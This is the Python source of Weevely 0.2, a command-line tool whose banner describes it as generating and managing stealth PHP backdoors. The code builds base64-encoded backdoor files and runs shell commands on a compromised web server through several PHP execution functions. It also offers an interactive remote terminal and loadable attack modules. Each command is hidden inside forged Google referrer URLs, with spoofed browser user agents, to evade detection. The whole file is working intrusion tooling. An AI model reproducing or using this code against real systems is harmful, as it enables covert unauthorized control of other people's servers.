#!/usr/bin/env python
# -*- coding: utf-8 -*-

import getopt, sys, base64, os, urllib2, re, urlparse, os, random, readline, rlcompleter, atexit

history     = os.path.expanduser( '~/.weevely_history' )
completions = {}

def autoComplete( text, state ):
	try:
		matches = completions[text]
	except KeyError:
		matches = []
		items   = readline.get_current_history_length()
		for i in range( items ):
			item = readline.get_history_item(i)
			if item != None and text in item:
				matches.append(item)
		
		completions[text] = matches
		
	try:
		return matches[state]
	except IndexError:
		return None

try:
    readline.parse_and_bind( 'tab: menu-complete' )
    readline.set_completer( autoComplete )
    readline.read_history_file(history)
except IOError:
    pass
    
atexit.register( readline.write_history_file, history )

methods= [ "system()", "passthru()", "popen()", "exec()", "proc_open()", "shell_exec()", "pcntl_exec()", "perl->system()", "python_eval()" ]

class weevely:
  
  modules = {}
  
  def main(self):
    
    self.banner()
    self.loadmodules()
  
    escape=-1
    
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'ltgsm:c:u:p:o:e:', ['list', 'module', 'generate', 'url', 'password', 'terminal', 'command', 'output', 'escape'])
    except getopt.error, msg:
	print "! ERROR:", msg, "\n"
	exit(2)
    
    for o, a in opts:
	if o in ("-g", "-generate"):
	  moderun='g'
	if o in ("-t", "-terminal"):
	  moderun='t'
	if o in ("-l", "-list"):
	  moderun='l'
	if o in ("-c", "-command"):
	  cmnd=a
	  moderun='c'
	if o in ("-m", "-module"):
	  modul=a
	  moderun='m'
	if o in ("-e", "-escape"):
	  try:
	    escape=int(a)
	    if escape<0 or escape>8 or escape%1!=0:
	      print "! ERROR: escape method is not a valid integer.\n"
	      return
	  except ValueError:
	    print "! ERROR: escape method is not a valid integer.\n"
	    return

	if o in ("-s", "-show"):
	  escape=-1
	  moderun='s'
	if o in ("-u", "-url"):
	  url=a
	  parsed=urlparse.urlparse(url)
	  if not parsed.scheme:
	    url="http://"+url
	  if not parsed.netloc:
	    print "! ERROR: URL not valid\n"
	    sys.exit(1)
	  
	if o in ("-p", "-password"):
	  if len(a)<4:
	    print "! ERROR: required almost 4 character long password\n"
	    sys.exit(1)
	  pwd=a
	if o in ("-o", "-output"):
	  outfile=a

    # Start
    if 'moderun' in locals():

      if moderun=='c' or moderun=='t' or moderun=='m' or moderun=='s':
	
	if 'pwd' not in locals():
	  pwd=''
	  while not pwd or len(pwd)<4:
	    print "+ Please insert almost 4 character long password: ",
	    pwd = sys.stdin.readline().strip()
	
	if 'url' not in locals():
	  print "! Please specify URL (-u)\n"
	  sys.exit(1)
	  
	try:
	  self.host=host(url,pwd)
	except Exception, e:
	  print "! ERROR: " + str(e) + ". Exiting...\n"
	  return
	
	if moderun=='s':
	  if self.host.checkexecution(-2)<0:
	    return

      if moderun=='g':
	if 'pwd' not in locals():
	  pwd=''
	  while not pwd or len(pwd)<4:
	    print "+ Please insert almost 4 character long password: ",
	    pwd = sys.stdin.readline().strip()
	
	if 'outfile' not in locals():
	  print "! Please specify where generate backdoor file (-o)"
	  sys.exit(1)
	
      if moderun=='c':       
	try:
	  if self.host.checkexecution(escape)<0:
	    return
	  print self.host.execute(cmnd)
	except Exception, e:
	  #print '! Command execution failed: ' + str(e) + '.'
	  raise
	return

      if moderun=='t':
	if self.host.checkexecution(escape)<0:
	  return
	self.terminal(url,pwd)
      if moderun=='g':
	self.generate(pwd,outfile)
      if moderun=='m':
	self.execmodule(url,pwd,modul,os)
      if moderun=='l':
	self.listmodules()
    else:
      self.usage()
      sys.exit(1)

  def usage(self):
	print ("  Generate backdoor crypted code:\n" +
			"\tweevely -g -o <filepath> -p <pass>\n\n" +
			"  Execute remote commands:\n" +
			"\tweevely -c <command> -u <url> -p <pass>\n\n" +
			"  Start remote terminal:\n" +
			"\tweevely -t -u <url> -p <password>\n\n" +     
			"  Bypass PHP hardening protections.\n\n" +
			"\tShow available remote functions:\n" +
			"\tweevely -s -u <url> -p <password>\n\n" +
			"\tExecute function:\n" +
			"\tweevely -e <function number> -t -u <url> -p <password>\n\n" +
			"  Execute PHP modules on remote server.\n\n" +
			"\tList available modules:\n" +
			"\tweevely -l\n\n" +
			"\tExecute module:\n" +
			"\tweevely -m <module>::<1arg>::..::<Narg> -u <url> -p <pass>\n");
    
  def banner(self):
    print ("\n  Weevely 0.2 - Generate and manage stealth PHP backdoors.\n" +
			"  Copyright (c) 2010-2011 Weevely Developers\n" + 
			"  Website: http://code.google.com/p/weevely/\n" +
			"  Original work: Emilio Pinna\n");
    
  def terminal(self, url, pwd):
    
    hostname=urlparse.urlparse(url)[1]
    
    while True:
		cmnd = raw_input( hostname + '> ' )
		if cmnd!='\n':
			readline.add_history(cmnd)
			print self.host.execute(cmnd)

  def generate(self,key,path):
    f_tocrypt = file('php/encoded_backdoor.php')
    f_back = file('php/backdoor.php')
    f_output = file(path,'w')
    
    str_tocrypt = f_tocrypt.read()
    new_str_tocrypt = str_tocrypt.replace('%%%START_KEY%%%',key[:2]).replace('%%%END_KEY%%%',key[2:]).replace('\n','')
    str_crypted = base64.b64encode(new_str_tocrypt)
    str_back = f_back.read()
    new_str = str_back.replace('%%%BACK_CRYPTED%%%', str_crypted)
    
    f_output.write(new_str)
    print '+ Backdoor file ' + path + ' created with password '+ key + '.\n'

  def execmodule(self, url, pwd, modulestring, os):
    
    modname = modulestring.split('::')[0]
    modargs = modulestring.split('::')[1:]
    
    if not self.modules.has_key(modname):
      print '! Module', modname, 'doesn\'t exist. Print list (-l).'
    else:
      m = self.modules[modname]
      if m.has_key('arguments'):
	argnum=len(self.modules[modname]['arguments'])
	if len(modargs)!=argnum:
	  print '! Module', modname, 'takes exactly', argnum, 'argument/s:', ','.join(self.modules[modname]['arguments'])
	  print '! Description:', self.modules[modname]['description']
	  return
       
      if m.has_key('os'):
	if self.host.os not in self.modules[modname]['os']:
	  print '- Warning: remote system \'' + self.host.os + '\' and module supported system/s \'' + ','.join(self.modules[modname]['os']).strip() + '\' seems not compatible.'
	  print '- Press enter to continue or control-c to exit'
	  sys.stdin.readline()
	
      f = file('modules/' + modname + '.php')
      modargsstring='"'+'","'.join(modargs) + '"'
      modutext = '$ar = Array(' + modargsstring + ');\n' + f.read()
      
      toinject=''
      for i in modutext.split('\n'):
	if len(i)>2 and ( i[:2] == '//' or i[0] == '#'):
	  continue
	toinject=toinject+i+'\n'
      
      try:
	ret = self.host.execute_php(toinject)
      except Exception, e:
	#print '! Module execution failed: ' + str(e) + '.'
	raise
      else:
	print ret
   
  def listmodules(self):
    
    for n in self.modules.keys():
      m = self.modules[n]
      
      print '+ Module:', m['name']
      if m.has_key('OS'):
	print '  Supported OSs:', m['OS']
      
      if m.has_key('arguments'):
	print '  Usage: weevely -m ' + m['name'] + "::<" + '>::<'.join(m['arguments']) + '>' + ' -u <url> -p <password>'
      else:
	print '  Usage: weevely -m ' + m['name'] + ' -u <url> -p <password>'
	
      if m.has_key('description'):
	print '  Description:', m['description'].strip()

      print ''
  
  def loadmodules(self):
    files = os.listdir('modules')
    
    for f in files:
      module={}
      
      if f.endswith('.php'):
	
		mod = file('modules/' + f)
		modstr = mod.read()
		modname = f[:-4]
		module['name']=modname
		
		restring='//.*Author:(.*)'
		e = re.compile(restring)
		founded=e.findall(modstr)
		if founded:
		  module['author']=founded[0]

		restring='//.*Description:(.*)'
		e = re.compile(restring)
		founded=e.findall(modstr)
		if founded:
		  module['description']=founded[0]
		  
		restring='//.*Arguments:(.*)'
		e = re.compile(restring)
		founded=e.findall(modstr)
		if founded:
		  module['arguments'] = [v.strip() for v in founded[0].split(',')]

		restring='//.*OS:(.*)'
		e = re.compile(restring)
		founded=e.findall(modstr)
		if founded:
		  module['os'] = [v.strip() for v in founded[0].split(',')]

		self.modules[module['name']]=module
    
class host():
  
  def __init__(self,url,pwd):
    self.url=url
    self.pwd=pwd
    self.method=-1

    os = self.checkbackdoor()
    
    self.os=os

  def checkbackdoor(self):
    
    os = None
    
    # Eval test + OS check
    try:
      os = self.execute_php("echo PHP_OS;")
    except Exception, e:
      raise

    return os

  def checkexecution(self, escape = -1):

    sum_ok = []
    sum_no = {}

    if escape < 0:
      ran = range(0,9)
    else:
      ran = [ escape ]
      
    first=-1
    ret=''
    for i in ran:
      try:
	ret = self.execute("echo " + self.pwd, i)
	if(ret==self.pwd):
	  if first == -1:
	    first=i
	    if escape != -2:
	      break
	  sum_ok.append(methods[i])
	  
	else:
	  sum_no[methods[i]]=ret
      except Exception, e:
	sum_no[methods[i]]='! ERROR: ' + ret + " " + str(e)

    # Summary 
    if len(sum_ok)>0 and escape==-2:
      print "+ Accepted functions:",
      for m in sum_ok:
	  print  str(methods.index(m)) + " [" + m + "]", 
      print '\n'
	  
    if first == -1 or ( len(sum_no)>0 and escape==-2 ):
      print "- Unsupported functions: ",
      for m in sum_no:
	print  str(methods.index(m)) + " [" + m + "]", 
      print '\n'  
	
    if first==-1:
      print '! No working functions founded on ' + self.url + '. Exiting...\n'
    else:
      self.method = first
      if escape != -2:
	print '+ Using method ' + str(first) + ' [' + methods[first] + '] on ' + self.url +'\n'
    
    return first

  def execute_php(self,cmnd):
    
    cmnd=cmnd.strip()
    cmdstr=base64.b64encode(cmnd)
    
    try: 
      ret=self.execHTTPGet(self.genRefUrl(cmdstr),self.genUserAgent())
    except urllib2.URLError, e:
      raise
    else: 
      restring='<' + self.pwd[2:] + '>(.*)</' + self.pwd[2:] + '>'
      e = re.compile(restring,re.DOTALL)
      founded=e.findall(ret)
      if len(founded)<1:
	raise Exception('No PHP evaluation. Check url, password, and backdoor installation')
      else:
	return founded[0].strip()

  def execute(self, cmnd, met=-1):
    
    if(met==-1):
      met=self.method
      
    if(met==0):
      cmnd="@system('" + cmnd + " 2>&1');"
    elif(met==1):
      cmnd="passthru('" + cmnd + " 2>&1');"
    elif(met==2):
      # Using while() fread() because more common than stream_get_content()
      cmnd="$h=popen('" + cmnd + "', 'r'); while(!feof($h)) echo(fread($h,4096)); pclose($h);"
    elif(met==3):
      # Need \n added
      cmnd="exec('" + cmnd + " 2>&1', $r); echo(join(\"\\n\",$r));"
    elif(met==4):
      cmnd = "$p = array(array('pipe', 'r'), array('pipe', 'w'), array('pipe', 'w')); $h = proc_open('" + cmnd + "', $p, $pipes); while(!feof($pipes[1])) echo(fread($pipes[1],4096)); while(!feof($pipes[2])) echo(fread($pipes[2],4096)); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($h);" 
    elif(met==5):
      cmnd="echo shell_exec('" + cmnd + " 2>&1');"
    elif(met==6):
      # Not available in PHP compiled as apache module
      cmnd="$u = array('" + "','".join(cmnd.split(' ')[1:]) + "'); pcntl_exec('" + cmnd.split()[0] + "', $u);"
    elif(met==7):
      # Needs perl extension
      cmnd="$perl = new perl(); $r = @perl->system('" + cmnd + " 2>&1'); echo $r"
    elif(met==8):
      #Needs python extension
      cmnd="@python_eval('import os; os.system('" + cmnd + " 2>&1');"

    ret = self.execute_php(cmnd)
    return ret
    
  def execHTTPGet(self, refurl, useragent):
    req = urllib2.Request(self.url)
    req.add_header('Referer', refurl)
    req.add_header('User-Agent', useragent)
    r = urllib2.urlopen(req)
    return r.read()    
  
  def genUserAgent(self):
    agents = ['Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.14) Gecko/2009090216 Ubuntu/9.04 (jaunty) Firefox/3.0.14', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB5; InfoPath.1)' ]
    
    return agents[random.randint(0,len(agents)-1)]
    
  def genRefUrl(self,cmdstr):
    #As seen in offical google blog: http://analytics.blogspot.com/2009/04/upcoming-change-to-googlecom-search.html
    # http://www.google.com/url?sa=t&source=web&ct=res&cd=7&url=http%3A%2F%2Fwww.example.com%2Fmypage.htm&ei=0SjdSa-1N5O8M_qW8dQN&rct=j&q=flowers&usg=AFQjCNHJXSUh7Vw7oubPaO3tZOzz-F-u_w&sig2=X8uCFh6IoPtnwmvGMULQfw
    # Old
    # refurl='http://www.google.com/url?sa=' + self.pwd[:2] + '&source=' + cmdstr[:len(cmdstr)/2] + '&ei=' + cmdstr[(len(cmdstr)/2):]
    
    parsed=urlparse.urlparse(self.url)
    if not parsed.path:
      q=parsed.netloc.replace('/',' ')
    else:
      simple_path=''.join(parsed.path.split('.')[:-1])
      q=simple_path.replace('/',' ')
      
    #real_refurl = 'http://www.google.com/url?' + 'sa=' + self.pwd[:2] + '&source=web&ct=7' + '&url=' + urllib2.quote(parsed.geturl(),'') + '&q=' + q + '&usg=' + cmdstr[:len(cmdstr)/2] + '&sig2=' + cmdstr[(len(cmdstr)/2):] 
    
    real_refurl = 'http://www.google.com/url?' + 'sa=' + self.pwd[:2] + '&source=web&ct=7' + '&url=' + urllib2.quote(parsed.geturl(),'') + '&rct=j&q=' + q + '&ei=' + cmdstr[:len(cmdstr)/3] +'&usg=' + cmdstr[len(cmdstr)/3:len(cmdstr)*2/3] + '&sig2=' + cmdstr[len(cmdstr)*2/3:] 
    
    return ''.join(real_refurl)
    
if __name__ == "__main__":
    
    app=weevely()
    try:
      app.main()
    except KeyboardInterrupt:
      print '\n\n! Received keyboard interrupt. Exiting...\n'
